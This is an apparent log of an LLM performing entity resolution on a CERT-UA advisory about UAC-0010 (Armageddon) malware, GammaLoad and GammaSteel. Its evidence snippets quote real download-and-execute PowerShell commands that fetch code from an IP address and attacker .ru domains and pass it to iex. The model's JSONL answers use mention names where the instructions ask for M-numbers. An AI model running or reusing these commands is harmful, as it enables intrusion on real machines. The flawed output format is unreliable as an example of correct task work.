=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. stage1.ps1
E161. viewdns.info
E162. www.portcheckers.com
E163. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E1, E11, E3, E4 — ctx: S1
M3. "HarvesterX" (Software) — options: E16, E17, E18, E12 — ctx: S1
M4. "PowerShell (powershell.exe)" (Software) — options: E25, E7, E26, E27 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E37, E38, E39, E40
M6. "atlantar.ru" (Domain) — options: E43, E47, E38, E37
M7. "motoristo.ru" (Domain) — options: E42, E44, E51, E38 — ctx: S8
M8. "moolin.ru" (Domain) — options: E37, E38, E45, E41
M9. "bubenci.ru" (Domain) — options: E56, E38, E57, E50
M10. "callsol.ru" (Domain) — options: E37, E46, E48, E38
M11. "clipperso.ru" (Domain) — options: E43, E38, E63, E50
M12. "cooperi.ru" (Domain) — options: E65, E38, E66, E37
M13. "detroito.ru" (Domain) — options: E50, E57, E39, E38
M14. "farafauler.ru" (Domain) — options: E43, E38, E69, E45
M15. "flayga.ru" (Domain) — options: E42, E38, E39, E56 — ctx: S4
M16. "ganara.ru" (Domain) — options: E69, E73, E39, E38 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E43, E57, E38, E45
M18. "hofsteder.ru" (Domain) — options: E77, E38, E78, E37
M19. "kilitro.ru" (Domain) — options: E42, E39, E38, E50
M20. "kurapat.ru" (Domain) — options: E45, E68, E46, E38
M21. "lnasfe.ru" (Domain) — options: E43, E83, E84, E38 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E74, E64, E85, E38
M23. "mafirti.ru" (Domain) — options: E37, E58, E38, E42
M24. "metanat.ru" (Domain) — options: E50, E68, E54, E38
M25. "mitlubald.ru" (Domain) — options: E37, E80, E38, E43
M26. "paparat.ru" (Domain) — options: E69, E68, E89, E38 — ctx: S5
M27. "pasamart.ru" (Domain) — options: E37, E38, E85, E43
M28. "qkcew.ru" (Domain) — options: E53, E38, E91, E92
M29. "rncsq.ru" (Domain) — options: E53, E38, E94, E92
M30. "tarlit.ru" (Domain) — options: E37, E68, E38, E42
M31. "tbwelo.ru" (Domain) — options: E37, E38, E44, E53
M32. "wicksl.ru" (Domain) — options: E50, E38, E75, E45
M33. "xcqef.ru" (Domain) — options: E43, E38, E81, E45
M34. "nxkad.ru" (Domain) — options: E93, E80, E38, E43 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E99, E100, E101, E102
M36. "tools.nexcess.net" (Domain) — options: E108, E109, E110, E111
M37. "viewdns.info" (Domain) — options: E115, E99, E110, E117
M38. "www.portcheckers.com" (Domain) — options: E123, E124, E51, E125 — ctx: S7

=== RESPONSE (74.2s, in 4400 / out 8543 tok, stop) ===
{"m":"GammaSteel.PS1","id":"NEW","g":"PowerShell implementation of GammaSteel"}
{"m":"GammaSteel.NET","id":"NEW","g":"NET implementation of GammaSteel"}
{"m":"HarvesterX","id":"NEW","g":"previously used tool"}
{"m":"PowerShell (powershell.exe)","id":"E25","g":null}
{"m":"lover.printing82.detroito.ru","id":"NEW","g":null}
{"m":"atlantar.ru","id":"NEW","g":null}
{"m":"motoristo.ru","id":"NEW","g":null}
{"m":"moolin.ru","id":"NEW","g":null}
{"m":"bubenci.ru","id":"NEW","g":null}
{"m":"callsol.ru","id":"NEW","g":null}
{"m":"clipperso.ru","id":"NEW","g":null}
{"m":"cooperi.ru","id":"NEW","g":null}
{"m":"detroito.ru","id":"NEW","g":null}
{"m":"farafauler.ru","id":"NEW","g":null}
{"m":"flayga.ru","id":"NEW","g":null}
{"m":"ganara.ru","id":"NEW","g":null}
{"m":"hawksi.ru","id":"NEW","g":null}
{"m":"hofsteder.ru","id":"NEW","g":null}
{"m":"kilitro.ru","id":"NEW","g":null}
{"m":"kurapat.ru","id":"NEW","g":null}
{"m":"lnasfe.ru","id":"NEW","g":null}
{"m":"lopasts.ru","id":"NEW","g":null}
{"m":"mafirti.ru","id":"NEW","g":null}
{"m":"metanat.ru","id":"NEW","g":null}
{"m":"mitlubald.ru","id":"NEW","g":null}
{"m":"paparat.ru","id":"NEW","g":null}
{"m":"pasamart.ru","id":"NEW","g":null}
{"m":"qkcew.ru","id":"NEW","g":null}
{"m":"rncsq.ru","id":"NEW","g":null}
{"m":"tarlit.ru","id":"NEW","g":null}
{"m":"tbwelo.ru","id":"NEW","g":null}
{"m":"wicksl.ru","id":"NEW","g":null}
{"m":"xcqef.ru","id":"NEW","g":null}
{"m":"nxkad.ru","id":"NEW","g":null}
{"m":"dnslookup.seowebchecker.com","id":"NEW","g":null}
{"m":"tools.nexcess.net","id":"NEW","g":null}
{"m":"viewdns.info","id":"NEW","g":null}
{"m":"www.portcheckers.com","id":"NEW","g":null}
